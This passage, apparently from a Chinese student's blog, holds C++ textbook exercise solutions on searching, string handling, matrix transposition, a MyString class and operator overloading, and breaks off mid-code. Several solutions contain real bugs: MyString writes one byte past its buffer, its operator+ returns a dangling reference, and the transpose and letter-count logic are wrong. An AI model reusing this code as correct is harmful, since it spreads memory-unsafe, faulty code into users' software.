class="type">const</span> T list[], <span class="type">int</span> n, <span class="type">const</span> T &amp;key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (list[i] == key)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-折半查找"><a href="#2-折半查找" class="headerlink" title="2. 折半查找"></a>2. 折半查找</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binSearch</span><span class="params">(<span class="type">const</span> T list[],<span class="type">int</span> min ,<span class="type">int</span> max, <span class="type">const</span> T &amp;key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (min &gt; max) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> mid = (min + max) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (list[mid] == key) &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (list[mid] &gt; key) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">binSearch</span>(list, min, mid - <span class="number">1</span>,key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">binSearch</span>(list, mid + <span class="number">1</span>, max, key);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binSearch_2</span><span class="params">(<span class="type">const</span> T list[], <span class="type">int</span> n, <span class="type">const</span> T &amp;key)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> low = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> high = n - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line"><span class="type">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (list[mid] == key) &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (list[mid] &lt; key)</span><br><span class="line">low = mid + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">high = mid - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><ol><li>6-21读取字符串统计英文字母个数</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">ifstream <span class="title">in</span><span class="params">(<span class="string">&quot;C:/Users/lenovo/Desktop/abc.txt&quot;</span>,ios_base::binary | ios_base::in)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">os</span><span class="params">(<span class="string">&quot;C:/Users/lenovo/Desktop/abc.txt&quot;</span>, ios_base::binary | ios_base::out)</span></span>;</span><br><span class="line">string str;</span><br><span class="line"><span class="built_in">getline</span>(cin, str);</span><br><span class="line">os &lt;&lt; str;</span><br><span class="line">os.<span class="built_in">close</span>();</span><br><span class="line">string get_s;</span><br><span class="line"><span class="built_in">getline</span>(in,get_s);</span><br><span class="line">in.<span class="built_in">close</span>();</span><br><span class="line">cout &lt;&lt; get_s;</span><br><span class="line"><span class="type">char</span> *c = &amp;get_s[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*c) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*c &gt;= <span class="string">&#x27;A&#x27;</span>) &amp;&amp; (*c &lt;= <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">c++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;count: &quot;</span>&lt;&lt; count;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>6-22 字符串递归逆置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reverse</span><span class="params">(string &amp;s,<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a = <span class="number">0</span>;             <span class="comment">//重要</span></span><br><span class="line"><span class="keyword">if</span> (n / <span class="number">2</span> &lt;= a ) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">char</span> temp = s[a];</span><br><span class="line">s[a] = s[n - a <span class="number">-1</span>];</span><br><span class="line">s[n -a <span class="number">-1</span>] = temp;</span><br><span class="line">a++;</span><br><span class="line"><span class="built_in">reverse</span>(s,n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">string a = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line"><span class="built_in">reverse</span>(a, a.<span class="built_in">length</span>());</span><br><span class="line">cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>6-26  矩阵转置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> row;</span><br><span class="line"><span class="type">int</span> arrange;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">(<span class="type">int</span> *p,<span class="type">int</span> row, <span class="type">int</span> arrange)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; arrange; j++) &#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>)&lt;&lt; p[i*arrange + j];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">transfom</span><span class="params">(<span class="type">int</span> *p)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; arrange; j++) &#123;</span><br><span class="line"><span class="type">int</span> temp = p[i*row + j];</span><br><span class="line">p[i*row + j] = p[j*arrange + i];</span><br><span class="line">p[j*arrange + i] = temp;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入行和列&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; row &gt;&gt; arrange;</span><br><span class="line"><span class="type">int</span>  *matrxi = <span class="keyword">new</span> <span class="type">int</span>[row * arrange];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; arrange; j++) &#123;</span><br><span class="line">matrxi[i*arrange + j] = <span class="built_in">rand</span>()%<span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">output</span>(matrxi,row,arrange);</span><br><span class="line"><span class="built_in">transfom</span>(matrxi);</span><br><span class="line"><span class="built_in">output</span>(matrxi, arrange, row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>基于char*设计一个字符串类<code>Mystring</code>,并且具有构造函数,析构函数,赋值构造函数,重载运算符等</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyString</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span> *data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> len;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">MyString</span>();</span><br><span class="line"><span class="built_in">MyString</span>(<span class="type">unsigned</span> <span class="type">short</span>);</span><br><span class="line"><span class="built_in">MyString</span>(<span class="type">const</span> <span class="type">char</span> *s);</span><br><span class="line"><span class="built_in">MyString</span>(<span class="type">const</span> MyString &amp;s);</span><br><span class="line">~<span class="built_in">MyString</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="title">getLen</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> len; &#125;   <span class="comment">//返回长度</span></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">getString</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> data; &#125;</span><br><span class="line">MyString&amp;  <span class="keyword">operator</span> +(<span class="type">const</span> MyString &amp;rhs);</span><br><span class="line">MyString&amp;  <span class="keyword">operator</span>=(<span class="type">const</span> MyString &amp;rhs);</span><br><span class="line"><span class="type">char</span> <span class="keyword">operator</span>[] (<span class="type">unsigned</span> <span class="type">short</span> offset) <span class="type">const</span>;</span><br><span class="line"><span class="type">char</span>&amp; <span class="keyword">operator</span> [](<span class="type">unsigned</span> <span class="type">short</span> offset);</span><br><span class="line">&#125;;</span><br><span class="line">MyString::<span class="built_in">MyString</span>() &#123;</span><br><span class="line">len = <span class="number">0</span>;</span><br><span class="line">data = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>];</span><br><span class="line">data[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyString::<span class="built_in">MyString</span>(<span class="type">unsigned</span> <span class="type">short</span> len) &#123;</span><br><span class="line">data = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">data[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>-&gt;len = len;</span><br><span class="line">&#125;</span><br><span class="line">MyString::<span class="built_in">MyString</span>(<span class="type">const</span> <span class="type">char</span> *s) &#123;</span><br><span class="line">len = (<span class="type">int</span>)<span class="built_in">strlen</span>(s);</span><br><span class="line">data = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">data[i] = s[i];</span><br><span class="line">&#125;</span><br><span class="line">data[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyString::<span class="built_in">MyString</span>(<span class="type">const</span> MyString &amp;s) &#123;</span><br><span class="line">len = s.<span class="built_in">getLen</span>();</span><br><span class="line">data = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">data[i] = s[i];</span><br><span class="line">&#125;</span><br><span class="line">data[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyString::~<span class="built_in">MyString</span>() &#123;</span><br><span class="line"><span class="keyword">delete</span>[] data;</span><br><span class="line">len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> MyString::<span class="keyword">operator</span>[](<span class="type">unsigned</span> <span class="type">short</span> offset) <span class="type">const</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (offset &gt; len) &#123;</span><br><span class="line"><span class="keyword">return</span> data[len - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> data[offset];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>&amp; MyString::<span class="keyword">operator</span> [](<span class="type">unsigned</span> <span class="type">short</span> offset) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset &gt; len) &#123;</span><br><span class="line"><span class="keyword">return</span> data[len - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> data[offset];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">MyString&amp; MyString::<span class="keyword">operator</span>+(<span class="type">const</span> MyString &amp;rhs) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> totalLen = len + rhs.<span class="built_in">getLen</span>();</span><br><span class="line"><span class="function">MyString <span class="title">temp</span><span class="params">(totalLen)</span></span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i; i &lt; len; i++) &#123;</span><br><span class="line">temp[i] = data[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; rhs.<span class="built_in">getLen</span>(); j++, i++) &#123;</span><br><span class="line">temp[i] = rhs[j];</span><br><span class="line">&#125;</span><br><span class="line">temp[totalLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">MyString&amp; MyString::<span class="keyword">operator</span>=(<span class="type">const</span> MyString &amp;rhs) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> == &amp;rhs) &#123;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[] data;</span><br><span class="line">len = rhs.<span class="built_in">getLen</span>();</span><br><span class="line">data = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">short</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">data[i] = rhs[i];</span><br><span class="line">&#125;</span><br><span class="line">data[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">MyString <span class="title">s1</span><span class="params">(<span class="string">&quot;SEU!&quot;</span>)</span></span>;</span><br><span class="line">MyString s2;</span><br><span class="line">s2 = <span class="string">&quot;ilike&quot;</span>;</span><br><span class="line">MyString s3 = s2 + s1;</span><br><span class="line">cout &lt;&lt; s3.<span class="built_in">getString</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h1><ol><li>时钟类重载</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设计一个时钟类，能够记录时、分、秒，重载它的++运算符，每执行一次++运算，加时1秒，但要使计时过程能够自动进位。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Time</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Time</span>(<span class="type">int</span> h = <span class="number">0</span>, <span class="type">int</span> m = <span class="number">0</span>, <span class="type">int</span> s = <span class="number">0</span>) &#123;</span><br><span class="line">hour = h;</span><br><span class="line">minute = m;</span><br><span class="line">second = s;</span><br><span class="line">&#125;</span><br><span class="line">Time&amp; <span class="keyword">operator</span>++();</span><br><span class="line">Time <span class="keyword">operator</span>++(<span class="type">int</span>);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;当前时间为：&quot;</span> &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> hour, minute, second;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">Time Time::<span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">Time tmp = *<span class="keyword">this</span>;</span><br><span class="line">++(*<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>++() &#123;</span><br><span class="line">++second;</span><br><span class="line"><span class="keyword">if</span> (second == <span class="number">60</span>) &#123;</span><br><span class="line">second = <span class="number">0</span>;</span><br><span class="line">++minute;</span><br><span class="line"><span class="keyword">if</span> (minute == <span class="number">60</span>) &#123;</span><br><span class="line">minute = <span class="number">0</span>;</span><br><span class="line">hour++;</span><br><span class="line"><span class="keyword">if</span> (hour == <span class="number">24</span>) &#123;</span><br><span class="line">hour = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Time <span class="title">t</span><span class="params">(<span class="number">23</span>, <span class="number">59</span>, <span class="number">59</span>)</span></span>;</span><br><span class="line">t.<span class="built_in">showTime</span>();</span><br><span class="line">(t++).<span class="built_in">showTime</span>();</span><br><span class="line">(++t).<span class="built_in">showTime</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>重载complex类 <code>&lt;&lt;</code></p><ul><li><p>&lt;&lt;左操作数为<code>ostream</code>类型的引用,<code>ostream</code>是<code>cout</code>的基类执行</p><p><code>cout&lt;&lt;c1</code>——-&gt;<code>operator&lt;&lt;(cout,c1)</code></p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Complex</span>() &#123; real = <span class="number">0</span>; imag = <span class="number">0</span>; &#125;</span><br><span class="line"><span 